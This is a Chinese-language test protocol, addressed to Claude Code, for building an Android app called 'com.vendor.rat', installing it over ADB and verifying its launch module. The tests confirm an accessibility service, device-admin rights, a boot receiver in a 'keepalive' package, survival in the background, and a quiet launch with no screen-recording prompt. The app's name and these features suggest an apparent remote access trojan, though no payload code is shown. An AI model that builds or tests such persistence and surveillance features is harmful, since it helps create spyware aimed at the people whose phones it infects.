# 设备验证协议 — 启动流程模块 (MODULE_08)

> Claude Code 执行此协议来构建 APK、安装到设备、验证启动流程模块是否正常工作。

## 前置条件

```
ADB = /mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe
DEVICE = 192.168.31.162:5555
PACKAGE = com.vendor.rat
APK = android/app/build/outputs/apk/debug/app-debug.apk
```

---

## Phase 4: 构建 + 安装

```bash
cd /home/code/php/project/full-package/android && ./gradlew assembleDebug 2>&1 | tail -20
```

验证: `BUILD SUCCESSFUL` + APK 文件存在

```bash
ADB="/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe"
DEVICE="192.168.31.162:5555"
$ADB connect $DEVICE
$ADB -s $DEVICE uninstall com.vendor.rat 2>/dev/null
$ADB -s $DEVICE install -r android/app/build/outputs/apk/debug/app-debug.apk
```

验证: `Success`

---

## Phase 5: 真机验证

### TEST-08-01: 应用进程启动

前置条件: APK 已安装，应用未运行
操作步骤:
1. 启动应用
2. 等待 3 秒
3. 检查进程

预期结果: 进程存活，返回 PID
验证命令:
```bash
$ADB -s $DEVICE shell am start -n com.vendor.rat/.activity.ActivMain
sleep 3
$ADB -s $DEVICE shell pidof com.vendor.rat
```
通过标准: 返回非空 PID

---

### TEST-08-02: MainApplication 初始化日志

前置条件: 应用刚启动
操作步骤:
1. 清除 logcat
2. 强制停止应用
3. 重新启动
4. 检查日志

预期结果: 看到 MainApplication 初始化日志
验证命令:
```bash
$ADB -s $DEVICE shell logcat -c
$ADB -s $DEVICE shell am force-stop com.vendor.rat
$ADB -s $DEVICE shell am start -n com.vendor.rat/.activity.ActivMain
sleep 5
$ADB -s $DEVICE shell logcat -d -s "MainApplication" | head -20
```
通过标准: 输出包含 "Initialization complete" 或类似初始化成功日志

---

### TEST-08-03: Activity 组件注册

前置条件: APK 已安装
操作步骤:
1. 检查 package dump 中的 Activity 列表

预期结果: 所有 MODULE_08 Activity 已注册
验证命令:
```bash
$ADB -s $DEVICE shell dumpsys package com.vendor.rat 2>&1 | grep -E "Activity|activity" | head -20
```
通过标准: 输出包含以下组件:
- `com.vendor.rat/.activity.ActivMain`
- `com.vendor.rat/.activity.PermissionActivity`

---

### TEST-08-04: ActivMain 作为 LAUNCHER

前置条件: APK 已安装
操作步骤:
1. 检查 LAUNCHER intent-filter

预期结果: ActivMain 注册为 LAUNCHER
验证命令:
```bash
$ADB -s $DEVICE shell dumpsys package com.vendor.rat 2>&1 | grep -B2 -A5 "LAUNCHER"
```
通过标准: 输出包含 `com.vendor.rat/.activity.ActivMain` 和 `android.intent.category.LAUNCHER`

---

### TEST-08-05: 启动不弹录屏权限

前置条件: 应用未运行
操作步骤:
1. 清除 logcat
2. 启动应用
3. 等待 5 秒
4. 检查是否有 MediaProjection 相关日志

预期结果: 启动时不应请求 MediaProjection
验证命令:
```bash
$ADB -s $DEVICE shell logcat -c
$ADB -s $DEVICE shell am force-stop com.vendor.rat
$ADB -s $DEVICE shell am start -n com.vendor.rat/.activity.ActivMain
sleep 5
$ADB -s $DEVICE shell logcat -d | grep -i "mediaprojection\|screen.capture\|录屏\|录制" | head -10
```
通过标准: 无 MediaProjection 相关日志输出（vendor 不在启动时请求录屏）

---

### TEST-08-06: 无障碍服务组件注册

前置条件: APK 已安装
操作步骤:
1. 检查无障碍服务注册

预期结果: MyAccessibilityService 已注册
验证命令:
```bash
$ADB -s $DEVICE shell dumpsys package com.vendor.rat 2>&1 | grep -A3 "AccessibilityService"
```
通过标准: 输出包含 `com.vendor.rat/.service.MyAccessibilityService`

---

### TEST-08-07: 设备管理员组件注册

前置条件: APK 已安装
操作步骤:
1. 检查设备管理员注册

预期结果: AppDeviceAdminReceiver 已注册
验证命令:
```bash
$ADB -s $DEVICE shell dumpsys package com.vendor.rat 2>&1 | grep -A3 "DEVICE_ADMIN"
```
通过标准: 输出包含 `com.vendor.rat/.service.AppDeviceAdminReceiver`

---

### TEST-08-08: 开机广播接收器注册

前置条件: APK 已安装
操作步骤:
1. 检查 BOOT_COMPLETED 接收器

预期结果: BootReceiver 已注册
验证命令:
```bash
$ADB -s $DEVICE shell dumpsys package com.vendor.rat 2>&1 | grep -A5 "BOOT_COMPLETED"
```
通过标准: 输出包含 `com.vendor.rat/.keepalive.receiver.BootReceiver`

---

### TEST-08-09: 缓存目录创建

前置条件: 应用已启动
操作步骤:
1. 检查应用数据目录

预期结果: 缓存目录已创建
验证命令:
```bash
$ADB -s $DEVICE shell "run-as com.vendor.rat ls cache/ 2>/dev/null || ls /data/data/com.vendor.rat/cache/ 2>/dev/null" | head -10
```
通过标准: 输出包含缓存子目录

---

### TEST-08-10: 应用无 Crash

前置条件: 应用已启动并运行 10 秒以上
操作步骤:
1. 检查 FATAL EXCEPTION
2. 检查 ANR

预期结果: 无 crash，无 ANR
验证命令:
```bash
$ADB -s $DEVICE shell logcat -d | grep -E "FATAL EXCEPTION|com.vendor.rat.*Exception" | head -10
$ADB -s $DEVICE shell "ls /data/anr/ 2>/dev/null" | head -5
```
通过标准: 无 FATAL EXCEPTION 输出

---

### TEST-08-11: 应用存活性（后台保持）

前置条件: 应用已启动
操作步骤:
1. 按 HOME 键回到桌面
2. 等待 30 秒
3. 检查进程是否存活

预期结果: 进程仍然存活
验证命令:
```bash
$ADB -s $DEVICE shell input keyevent KEYCODE_HOME
sleep 30
$ADB -s $DEVICE shell pidof com.vendor.rat
```
通过标准: 返回非空 PID

---

### TEST-08-12: ActivityLifecycleCallbacks 注册

前置条件: 应用已启动
操作步骤:
1. 启动 Activity
2. 按 HOME
3. 检查生命周期日志

预期结果: 前后台切换有日志
验证命令:
```bash
$ADB -s $DEVICE shell logcat -c
$ADB -s $DEVICE shell am start -n com.vendor.rat/.activity.ActivMain
sleep 2
$ADB -s $DEVICE shell input keyevent KEYCODE_HOME
sleep 2
$ADB -s $DEVICE shell logcat -d -s "LifecycleTracker" | head -10
```
通过标准: 输出包含 "foreground" 和/或 "background"

---

## 综合报告模板

```
MODULE_08 启动流程模块 — 设备验证报告
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
设备: {device_model} / Android {version}
APK:  {build_time} / {apk_size}

┌──────────────────────────────────┬────────┬──────────────────────────┐
│ 检查项                            │ 状态   │ 详情                      │
├──────────────────────────────────┼────────┼──────────────────────────┤
│ TEST-08-01 应用进程启动           │ ✅/❌  │ PID=xxxx                 │
│ TEST-08-02 MainApplication 初始化 │ ✅/❌  │ 日志正常/缺失             │
│ TEST-08-03 Activity 组件注册      │ ✅/❌  │ N 个已注册                │
│ TEST-08-04 LAUNCHER 注册          │ ✅/❌  │ ActivMain                │
│ TEST-08-05 启动不弹录屏权限       │ ✅/❌  │ 无弹窗/有弹窗             │
│ TEST-08-06 无障碍服务注册         │ ✅/❌  │ 已注册/未找到             │
│ TEST-08-07 设备管理员注册         │ ✅/❌  │ 已注册/未找到             │
│ TEST-08-08 开机广播注册           │ ✅/❌  │ 已注册/未找到             │
│ TEST-08-09 缓存目录创建           │ ✅/❌  │ 已创建/未创建             │
│ TEST-08-10 无 Crash               │ ✅/❌  │ 无异常/有异常             │
│ TEST-08-11 后台存活               │ ✅/❌  │ 存活/被杀                 │
│ TEST-08-12 生命周期回调           │ ✅/❌  │ 正常/缺失                 │
└──────────────────────────────────┴────────┴──────────────────────────┘

问题列表:
- (如有失败项，列出具体错误和建议修复方案)
```
